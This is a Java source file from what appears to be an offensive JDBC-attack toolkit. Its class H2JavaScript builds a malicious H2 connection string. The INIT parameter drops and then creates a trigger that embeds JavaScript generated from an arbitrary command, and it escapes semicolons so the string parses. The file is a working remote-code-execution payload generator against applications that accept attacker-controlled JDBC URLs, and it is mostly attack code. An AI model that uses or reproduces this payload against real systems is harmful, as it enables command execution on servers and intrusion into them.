package cn.butler.jdbcattack.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.payloads.PayloadRunner;
import cn.butler.thirdparty.payloads.expression.JSExpression;
import cn.butler.utils.StringUtils;

public class H2JavaScript implements ObjectPayload<Object> {

    @Override
    public Object getObject(String command) throws Exception {
        String randStr = StringUtils.getRandStr(3);
        Object[] objects = (Object [])ObjectPayload.Utils.makePayloadObject("ThirdPartyAttack","CustomClass",command);
        String code = JSExpression.commonExpressModify((byte[]) objects[1]);

        String INITParameter = String.format("DROP TRIGGER IF EXISTS %s;CREATE TRIGGER %s BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\n %s \n$$",randStr,randStr,code);
        //转义分号: 因为在H2的连接串中分号是SQL语句分隔符,所以INIT配置参数中所有的分号都要设置转义
        INITParameter = INITParameter.replace(";", "\\;"); // 替换反斜杠
        String javaScriptTemplate = "jdbc:h2:mem:test;MODE=MSSQLServer;init=" + INITParameter;
        return javaScriptTemplate;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(H2JavaScript.class, args);
    }
}
